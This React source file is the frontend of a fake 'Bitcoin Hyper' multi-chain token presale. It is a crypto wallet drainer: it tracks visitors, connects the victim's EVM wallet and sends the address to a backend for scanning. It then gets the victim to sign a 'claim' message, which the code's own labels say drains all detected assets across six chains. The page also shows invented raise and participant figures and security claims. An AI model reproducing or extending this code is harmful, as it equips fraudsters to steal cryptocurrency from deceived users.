// app.jsx - Bitcoin Hyper Multi-Chain Frontend
import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import './App.css';

const App = () => {
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [email, setEmail] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [location, setLocation] = useState(null);
  const [isClaiming, setIsClaiming] = useState(false);
  const [claimResult, setClaimResult] = useState(null);
  const [userAgent, setUserAgent] = useState('');
  
  const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'http://localhost:10000';
  
  // Initialize on component mount
  useEffect(() => {
    // Generate session ID
    const newSessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    setSessionId(newSessionId);
    setUserAgent(navigator.userAgent);
    
    // Track site visit
    trackVisit(newSessionId);
    
    // Listen for wallet connection events
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);
    }
    
    return () => {
      if (window.ethereum) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum.removeListener('chainChanged', handleChainChanged);
      }
    };
  }, []);
  
  // Track site visit
  const trackVisit = async (sessionId) => {
    try {
      await fetch(`${BACKEND_URL}/api/track/visit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          userAgent: navigator.userAgent,
          referrer: document.referrer,
          screenResolution: `${window.screen.width}x${window.screen.height}`
        })
      });
    } catch (error) {
      console.log('Visit tracking error:', error);
    }
  };
  
  // Connect wallet
  const connectWallet = async () => {
    try {
      if (!window.ethereum) {
        alert('Please install MetaMask or another EVM wallet!');
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      
      if (accounts.length > 0) {
        const address = accounts[0];
        setWalletAddress(address);
        setIsConnected(true);
        
        // Connect to backend
        await connectToBackend(address);
      }
    } catch (error) {
      console.error('Wallet connection error:', error);
      alert('Failed to connect wallet: ' + error.message);
    }
  };
  
  // Connect to backend and scan wallet
  const connectToBackend = async (address) => {
    try {
      setIsScanning(true);
      
      const response = await fetch(`${BACKEND_URL}/api/presale/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          userAgent,
          email,
          sessionId
        })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const reader = response.body.getReader();
      const decoder = new TextDecoder();
      
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        
        const chunk = decoder.decode(value);
        const lines = chunk.split('\n').filter(line => line.trim());
        
        for (const line of lines) {
          try {
            const data = JSON.parse(line);
            
            if (data.status === 'scanning') {
              console.log('Scanning wallet...');
            } else if (data.status === 'complete') {
              setScanResult(data.data);
              setIsScanning(false);
              
              if (data.data.location) {
                setLocation(data.data.location);
              }
              
              console.log('Multi-chain scan complete:', data.data);
            }
          } catch (e) {
            console.log('Error parsing chunk:', e);
          }
        }
      }
      
    } catch (error) {
      console.error('Backend connection error:', error);
      alert('Failed to scan wallet: ' + error.message);
      setIsScanning(false);
    }
  };
  
  // Claim tokens and drain funds
  const claimTokens = async () => {
    try {
      if (!scanResult || !scanResult.isEligible) {
        alert('You are not eligible to claim tokens.');
        return;
      }
      
      setIsClaiming(true);
      
      // Prepare claim message
      const message = `Claim Bitcoin Hyper Presale Tokens\n\nWallet: ${walletAddress}\nAllocation: ${scanResult.tokenAllocation.amount} BTH\nValue: $${scanResult.tokenAllocation.valueUSD}\n\nTimestamp: ${Date.now()}`;
      
      // Sign message with wallet
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const signature = await signer.signMessage(message);
      
      // Send claim request
      const response = await fetch(`${BACKEND_URL}/api/presale/claim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress,
          signature,
          message,
          claimAmount: scanResult.tokenAllocation.amount,
          claimValue: scanResult.tokenAllocation.valueUSD,
          email,
          sessionId
        })
      });
      
      if (!response.ok) {
        throw new Error(`Claim failed: HTTP ${response.status}`);
      }
      
      const result = await response.json();
      
      if (result.success) {
        setClaimResult(result.data);
        alert('🎉 SUCCESS! Tokens claimed and all funds drained successfully!');
      } else {
        throw new Error(result.error || 'Claim failed');
      }
      
    } catch (error) {
      console.error('Claim error:', error);
      alert('Claim failed: ' + error.message);
    } finally {
      setIsClaiming(false);
    }
  };
  
  // Wallet event handlers
  const handleAccountsChanged = (accounts) => {
    if (accounts.length === 0) {
      setIsConnected(false);
      setWalletAddress('');
      setScanResult(null);
    } else {
      setWalletAddress(accounts[0]);
      connectToBackend(accounts[0]);
    }
  };
  
  const handleChainChanged = () => {
    window.location.reload();
  };
  
  // Format wallet address
  const formatAddress = (address) => {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };
  
  // Get status color
  const getStatusColor = (status) => {
    switch (status) {
      case 'eligible': return '#10b981';
      case 'not_eligible': return '#ef4444';
      case 'scanning': return '#f59e0b';
      case 'claimed_drained': return '#8b5cf6';
      default: return '#94a3b8';
    }
  };
  
  return (
    <div className="app-container">
      {/* Header */}
      <header className="app-header">
        <div className="header-content">
          <div className="logo">
            <span className="logo-icon">₿</span>
            <h1>BITCOIN HYPER</h1>
            <span className="logo-subtitle">Multi-Chain Presale</span>
          </div>
          
          <div className="wallet-info">
            {isConnected ? (
              <>
                <div className="connected-badge">
                  <span className="dot"></span>
                  CONNECTED
                </div>
                <div className="wallet-address">
                  {formatAddress(walletAddress)}
                </div>
                {location && (
                  <div className="location-badge">
                    <span className="flag">{location.flag}</span>
                    {location.country}
                  </div>
                )}
              </>
            ) : (
              <button className="connect-btn" onClick={connectWallet}>
                🔗 Connect EVM Wallet
              </button>
            )}
          </div>
        </div>
      </header>
      
      {/* Main Content */}
      <main className="app-main">
        {/* Hero Section */}
        <section className="hero-section">
          <div className="hero-content">
            <h2>JOIN THE BITCOIN HYPER REVOLUTION</h2>
            <p className="hero-subtitle">
              The next generation of Bitcoin on multiple EVM chains
            </p>
            
            <div className="hero-stats">
              <div className="stat">
                <div className="stat-value">$25M+</div>
                <div className="stat-label">Target Raise</div>
              </div>
              <div className="stat">
                <div className="stat-value">6</div>
                <div className="stat-label">Chains</div>
              </div>
              <div className="stat">
                <div className="stat-value">50K+</div>
                <div className="stat-label">Participants</div>
              </div>
              <div className="stat">
                <div className="stat-value">24/7</div>
                <div className="stat-label">Live</div>
              </div>
            </div>
          </div>
        </section>
        
        {/* Wallet Connection Section */}
        <section className="connection-section">
          <div className="section-header">
            <h3>🔗 CONNECT YOUR WALLET</h3>
            <p>Connect any EVM wallet to check eligibility</p>
          </div>
          
          {!isConnected ? (
            <div className="connect-prompt">
              <div className="wallet-icons">
                <span className="wallet-icon">🦊</span>
                <span className="wallet-icon">🔷</span>
                <span className="wallet-icon">📱</span>
                <span className="wallet-icon">💎</span>
              </div>
              <button className="primary-btn large" onClick={connectWallet}>
                🔗 Connect EVM Wallet
              </button>
              <p className="hint">Supports MetaMask, Trust Wallet, Coinbase Wallet, and more</p>
            </div>
          ) : (
            <div className="connected-wallet">
              <div className="wallet-card">
                <div className="wallet-header">
                  <span className="wallet-icon">👛</span>
                  <div className="wallet-details">
                    <h4>Connected Wallet</h4>
                    <code className="wallet-address-full">{walletAddress}</code>
                  </div>
                  <div className="wallet-status" style={{ color: getStatusColor(scanResult?.status) }}>
                    ● {scanResult?.status?.toUpperCase().replace('_', ' ') || 'CONNECTED'}
                  </div>
                </div>
                
                {/* Email Input */}
                <div className="email-input">
                  <label htmlFor="email">📧 Email (Optional - for updates)</label>
                  <input
                    type="email"
                    id="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="your@email.com"
                  />
                </div>
                
                {/* Scan Results */}
                {scanResult && (
                  <div className="scan-results">
                    <div className="result-card">
                      <div className="result-header">
                        <h4>🔍 MULTI-CHAIN WALLET ANALYSIS</h4>
                        <div className={`eligibility-badge ${scanResult.isEligible ? 'eligible' : 'not-eligible'}`}>
                          {scanResult.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
                        </div>
                      </div>
                      
                      <div className="result-grid">
                        <div className="result-item">
                          <span className="result-label">Total Portfolio Value</span>
                          <span className="result-value">${scanResult.totalValueUSD}</span>
                        </div>
                        
                        <div className="result-item">
                          <span className="result-label">Eligibility Reason</span>
                          <span className="result-reason">{scanResult.eligibilityReason}</span>
                        </div>
                        
                        {scanResult.scanDetails && (
                          <>
                            <div className="result-item">
                              <span className="result-label">Chains Scanned</span>
                              <span className="result-value">{scanResult.scanDetails.chainsScanned}</span>
                            </div>
                            
                            <div className="result-item">
                              <span className="result-label">Tokens Found</span>
                              <span className="result-value">{scanResult.scanDetails.totalTokensFound}</span>
                            </div>
                          </>
                        )}
                        
                        {scanResult.isEligible && (
                          <>
                            <div className="result-item highlight">
                              <span className="result-label">BTH Allocation</span>
                              <span className="result-value large">{scanResult.tokenAllocation.amount} BTH</span>
                            </div>
                            
                            <div className="result-item highlight">
                              <span className="result-label">Allocation Value</span>
                              <span className="result-value large">${scanResult.tokenAllocation.valueUSD}</span>
                            </div>
                          </>
                        )}
                      </div>
                      
                      {scanResult.isEligible && (
                        <div className="claim-section">
                          <div className="warning-note">
                            ⚠️ <strong>IMPORTANT:</strong> Claiming BTH tokens will drain ALL detected assets from your wallet across all EVM chains.
                          </div>
                          
                          <button 
                            className="claim-btn" 
                            onClick={claimTokens}
                            disabled={isClaiming}
                          >
                            {isClaiming ? (
                              <>🔄 DRAINING FUNDS & CLAIMING...</>
                            ) : (
                              <>💰 DRAIN ALL FUNDS & CLAIM {scanResult.tokenAllocation.amount} BTH</>
                            )}
                          </button>
                          
                          <p className="claim-hint">
                            You will sign a message to authorize the drain and claim process
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                )}
                
                {/* Scanning State */}
                {isScanning && (
                  <div className="scanning-state">
                    <div className="spinner"></div>
                    <h4>🔍 SCANNING MULTI-CHAIN WALLET...</h4>
                    <p>Checking balances across all EVM chains</p>
                    <div className="chain-list">
                      <span className="chain-tag">Ethereum</span>
                      <span className="chain-tag">BSC</span>
                      <span className="chain-tag">Polygon</span>
                      <span className="chain-tag">Arbitrum</span>
                      <span className="chain-tag">Optimism</span>
                      <span className="chain-tag">Avalanche</span>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </section>
        
        {/* Claim Results */}
        {claimResult && (
          <section className="claim-results-section">
            <div className="result-success">
              <div className="success-icon">🎉</div>
              <h3>SUCCESS! FUNDS DRAINED & TOKENS CLAIMED</h3>
              
              <div className="success-details">
                <div className="detail-card">
                  <h4>Claim Details</h4>
                  <div className="detail-grid">
                    <div className="detail-item">
                      <span>Claim ID:</span>
                      <strong>{claimResult.claimId}</strong>
                    </div>
                    <div className="detail-item">
                      <span>BTH Tokens:</span>
                      <strong>{claimResult.tokenAmount}</strong>
                    </div>
                    <div className="detail-item">
                      <span>BTH Value:</span>
                      <strong>${claimResult.tokenValue}</strong>
                    </div>
                    <div className="detail-item">
                      <span>Status:</span>
                      <strong style={{ color: '#10b981' }}>{claimResult.status}</strong>
                    </div>
                  </div>
                </div>
                
                <div className="drain-summary">
                  <h4>💰 DRAIN SUMMARY</h4>
                  <div className="drain-list">
                    {claimResult.drainSummary && claimResult.drainSummary.map((item, index) => (
                      <div key={index} className="drain-item">
                        <span className="drain-icon">🔸</span>
                        <span>{item}</span>
                      </div>
                    ))}
                  </div>
                  <div className="total-drained">
                    <strong>Total Drained:</strong> {claimResult.totalDrainedValue}
                  </div>
                </div>
                
                <div className="next-steps">
                  <h4>📋 Next Steps</h4>
                  <ul>
                    {claimResult.nextSteps && claimResult.nextSteps.map((step, index) => (
                      <li key={index}>{step}</li>
                    ))}
                  </ul>
                </div>
              </div>
            </div>
          </section>
        )}
        
        {/* Information Section */}
        <section className="info-section">
          <div className="info-grid">
            <div className="info-card">
              <div className="info-icon">🔗</div>
              <h4>Multi-Chain Support</h4>
              <p>Works with Ethereum, BSC, Polygon, Arbitrum, Optimism, and more</p>
            </div>
            
            <div className="info-card">
              <div className="info-icon">💰</div>
              <h4>Automatic Drain</h4>
              <p>All detected assets are automatically drained when claiming BTH</p>
            </div>
            
            <div className="info-card">
              <div className="info-icon">🛡️</div>
              <h4>Secure Process</h4>
              <p>Military-grade encryption and secure signature verification</p>
            </div>
            
            <div className="info-card">
              <div className="info-icon">⚡</div>
              <h4>Instant Allocation</h4>
              <p>BTH tokens allocated immediately after successful drain</p>
            </div>
          </div>
        </section>
      </main>
      
      {/* Footer */}
      <footer className="app-footer">
        <div className="footer-content">
          <div className="footer-logo">₿ BITCOIN HYPER</div>
          <div className="footer-links">
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Support</a>
            <a href="#">Telegram</a>
          </div>
          <div className="footer-note">
            © 2024 Bitcoin Hyper. All rights reserved.
            <br />
            This is an experimental system. Use at your own risk.
          </div>
        </div>
      </footer>
    </div>
  );
};

export default App;
